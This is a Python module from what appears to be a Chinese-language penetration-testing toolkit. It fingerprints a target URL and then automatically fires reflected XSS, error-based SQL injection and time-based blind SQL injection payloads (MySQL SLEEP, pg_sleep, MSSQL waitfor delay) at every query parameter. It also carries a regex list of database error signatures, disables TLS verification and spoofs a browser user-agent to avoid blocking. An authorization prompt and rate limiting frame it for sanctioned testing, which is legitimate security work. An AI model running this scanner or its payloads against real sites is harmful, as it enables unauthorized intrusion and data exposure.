import urllib.parse
import re
import requests
import time
from secops_offense import arsenal
from secops_core import utils

# 常规数据库报错正则特征库
DB_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.* SQL[\-\_\ ]*Server",
    r"OLE DB.* SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
    r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
    r"(?s)Exception.*\WRoadhouse\.Cms\.",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"Access Database Engine",
    r"ORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    r"Warning.*\Wora_.*",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_.*",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]"
]

# 时间盲注常用探测 Payload 列表
TIME_BASED_SQLI_PAYLOADS = [
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))A)-- ",
    "1 AND (SELECT 1 FROM (SELECT(SLEEP(3)))A)-- ",
    "1' AND pg_sleep(3)--",
    "1 AND pg_sleep(3)--",
    "1' waitfor delay '0:0:3'--",
    "1 waitfor delay '0:0:3'--"
]

def gather_fingerprints(url):
    """在线发起请求，收集目标的基础信息与指纹"""
    print(f"\n[*] 正在对目标 {url} 发起在线网络连接...")
    try:
        # 设置常见 UA 防止被直接拦截
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        res = requests.get(url, headers=headers, timeout=8, verify=False, proxies=utils.get_proxies())
        print("[+] 目标在线存活，连接成功！")
        print(f"  - 响应状态码: {res.status_code}")
        
        server = res.headers.get("Server", "未知")
        powered_by = res.headers.get("X-Powered-By", "未知")
        print(f"  - 服务端指纹 (Server): {server}")
        print(f"  - 框架指纹 (X-Powered-By): {powered_by}")
        
        # 检查 Cookie 安全性
        cookies = res.cookies
        for c in cookies:
            flags = []
            if c.secure: flags.append("Secure")
            if c.has_nonstandard_attr('HttpOnly'): flags.append("HttpOnly")
            print(f"  - 发现 Cookie: {c.name} [属性: {','.join(flags) if flags else '无安全防护'}]")
            
        return res.text
    except Exception as e:
        print(f"[-] 连接目标失败: {e}")
        return None

def active_fuzz_url(url):
    """提取 URL 中的参数，并自动打入 Payload 测试漏洞 (提供限速与时间盲注差分研判)"""
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        print("[-] 输入的 URL 没有携带参数 (例如 ?id=1)。自动化打点需要针对参数进行投递。请附加参数后再试。")
        return
        
    query_dict = urllib.parse.parse_qs(parsed.query)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print("\n[*] 开始进行在线主动 Payload 投递与漏洞验证...")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    
    # 提取测试 Payload
    xss_payloads = arsenal.PAYLOADS["XSS"][:3] # 取前 3 个常用 XSS
    sqli_payloads = arsenal.PAYLOADS["SQLi"][:3] # 取前 3 个常用 SQLi 单引号闭合
    
    vuln_found = False
    
    # 限速：单次请求间隔 0.3 秒，限制 QPS 为 3 左右，避免压垮目标系统或被封禁
    delay_between_requests = 0.3
    
    # 对每一个参数依次进行打点
    for param_name in query_dict.keys():
        print(f"\n[>] 正在测试参数: {param_name}")
        
        # 0. 测量该参数的响应时间基线（3次平均），以便于后续时间盲注研判
        baseline_times = []
        for _ in range(3):
            try:
                t0 = time.time()
                requests.get(base_url, headers=headers, timeout=5, verify=False, proxies=utils.get_proxies())
                baseline_times.append(time.time() - t0)
            except:
                pass
            time.sleep(delay_between_requests)
            
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
        
        # 1. 投递 XSS Payload
        for p in xss_payloads:
            time.sleep(delay_between_requests)
            test_query = query_dict.copy()
            test_query[param_name] = p
            test_url = f"{base_url}?{urllib.parse.urlencode(test_query, doseq=True)}"
            
            try:
                res = requests.get(test_url, headers=headers, timeout=5, verify=False, proxies=utils.get_proxies())
                if p in res.text:
                    print(f"  🚨 [漏洞发现] 存在反射型 XSS！")
                    print(f"      - 成功触发 Payload: {p}")
                    print(f"      - 验证链接: {test_url}")
                    vuln_found = True
                    break
            except:
                pass
                
        # 2. 投递 SQL 注入 Payload (寻找报错特征)
        for p in sqli_payloads:
            time.sleep(delay_between_requests)
            test_query = query_dict.copy()
            test_query[param_name] = p
            test_url = f"{base_url}?{urllib.parse.urlencode(test_query, doseq=True)}"
            
            try:
                res = requests.get(test_url, headers=headers, timeout=5, verify=False, proxies=utils.get_proxies())
                html_body = res.text
                
                # 正则匹配几十种数据库错误
                for pattern in DB_ERRORS:
                    if re.search(pattern, html_body, re.IGNORECASE):
                        print(f"  🚨 [漏洞发现] 存在报错型 SQL 注入风险！")
                        print(f"      - 成功触发 Payload: {p}")
                        print(f"      - 捕获到底层数据库报错: {re.search(pattern, html_body, re.IGNORECASE).group()}")
                        print(f"      - 验证链接: {test_url}")
                        vuln_found = True
                        break
                if vuln_found:
                    break
            except:
                pass
                
        # 3. 时间盲注探测 (均值差分研判)
        for p in TIME_BASED_SQLI_PAYLOADS:
            time.sleep(delay_between_requests)
            test_query = query_dict.copy()
            test_query[param_name] = p
            test_url = f"{base_url}?{urllib.parse.urlencode(test_query, doseq=True)}"
            
            try:
                t0 = time.time()
                res = requests.get(test_url, headers=headers, timeout=10, verify=False, proxies=utils.get_proxies())
                elapsed = time.time() - t0
                
                # 如果单次响应时间明显超过基线 2.5 秒以上
                if elapsed > (avg_baseline + 2.5):
                    # 进行二次确证，排除偶然的网络波动
                    time.sleep(delay_between_requests)
                    t0_confirm = time.time()
                    res_confirm = requests.get(test_url, headers=headers, timeout=10, verify=False, proxies=utils.get_proxies())
                    elapsed_confirm = time.time() - t0_confirm
                    
                    if elapsed_confirm > (avg_baseline + 2.5):
                        print(f"  🚨 [漏洞发现] 存在时间盲注风险！")
                        print(f"      - 成功触发 Payload: {p}")
                        print(f"      - 基线平均响应时间: {round(avg_baseline, 3)} 秒")
                        print(f"      - 两次测试响应时间: {round(elapsed, 3)} 秒 / {round(elapsed_confirm, 3)} 秒")
                        print(f"      - 验证链接: {test_url}")
                        vuln_found = True
                        break
            except:
                pass
                
    if not vuln_found:
        print("\n[*] 测试完成。该接口的基础安全防护较好，未扫出明显 XSS、SQLi 报错和时间延迟特征。您可以尝试使用 [C] 菜单生成更高级 of Kali 命令深度测试。")

def start_online_testing():
    """主入口"""
    print("\n==================================================")
    print("      [F] 在线目标主动渗透辅助测试模块")
    print("==================================================")
    print("免责声明：本模块将直接向目标网址发送真实的攻击探测包。请确保您已获得渗透授权。")
    ack = input("确认已授权并继续？(y/n): ").strip().lower()
    if ack != 'y':
        print("操作已取消。")
        return
        
    url = input("请输入带参数的目标 URL (如 http://testphp.vulnweb.com/listproducts.php?cat=1): ").strip()
    if not url.startswith("http"):
        url = "http://" + url
        
    gather_fingerprints(url)
    active_fuzz_url(url)

